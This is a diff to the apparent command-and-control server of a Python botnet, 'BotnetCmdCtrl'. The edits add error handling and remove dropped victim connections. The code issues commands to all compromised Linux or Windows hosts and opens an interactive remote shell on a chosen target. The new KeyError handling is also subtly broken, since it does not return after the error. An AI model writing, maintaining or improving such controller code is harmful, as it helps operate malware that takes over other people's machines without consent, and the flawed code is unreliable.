@@ -227,10 +227,10 @@ class BotnetCmdCtrl:
 							print(BLUE + str(IP_ADDRESSES[1].index(ip)) + RESET + ' - ' + ip)
 
 			elif cmd.strip() == 'cnt lin':
-				print(f'[{PURPLE + BOLD + str(LINUX_COUNT) + RESET}] Linux targets.')
+				print(f'[{PURPLE + BOLD + str(LINUX_COUNT) + RESET}] Linux.')
 
 			elif cmd.strip() == 'cnt win':
-				print(f'[{PURPLE + BOLD + str(WINDOWS_COUNT) + RESET}] Windows targets.')
+				print(f'[{PURPLE + BOLD + str(WINDOWS_COUNT) + RESET}] Windows.')
 
 			elif cmd[:3] == 'lin':
 				resp_list = self.send_cmd_all_linux(cmd[4:])
@@ -392,8 +392,11 @@ class BotnetCmdCtrl:
 		except:
 			print(RED + '[-] An error was thrown...' + RESET)
 			return
-
-		conn = LINUX_CONNS[target_ip]
+		try:
+			conn = LINUX_CONNS[target_ip]
+		except KeyError:
+			print(RED + '[-] Invalid index!' + RED)
+			
 		while True:
 			cmd = input(PURPLE + f'[shell][{target_ip}]$ ' + RESET)
 			if cmd == 'back':
@@ -414,6 +417,7 @@ class BotnetCmdCtrl:
 				resp = conn.recv(BUFFER).decode(ENCODING)
 			except BrokenPipeError:
 				print(RED + f'[-] The connection to {target_ip} is no longer available.' + RESET)
+				del LINUX_CONNS[target_ip]
 				break
 			
 			if resp == '[-] Invalid command.' or resp == 'Ok':
@@ -442,7 +446,11 @@ class BotnetCmdCtrl:
 			print(RED + '[-] An error was thrown.' + RESET)
 			return
 
-		conn = WINDOWS_CONNS[target_ip]
+		try:
+			conn = WINDOWS_CONNS[target_ip]
+		except KeyError:
+			print(RED + '[-] Invalid index!' + RED)
+
 		while True:
 			cmd = input(PURPLE + f'[shell][{target_ip}]$ ' + RESET)
 			if cmd == 'back':
@@ -463,6 +471,7 @@ class BotnetCmdCtrl:
 				resp = conn.recv(BUFFER).decode(ENCODING)
 			except BrokenPipeError:
 				print(RED + f'[-] The connection to {target_ip} is no longer available.' + RESET)
+				del WINDOWS_CONNS[target_ip]
 				break
 
 			if resp == '[-] Invalid command...' or resp == 'Ok':
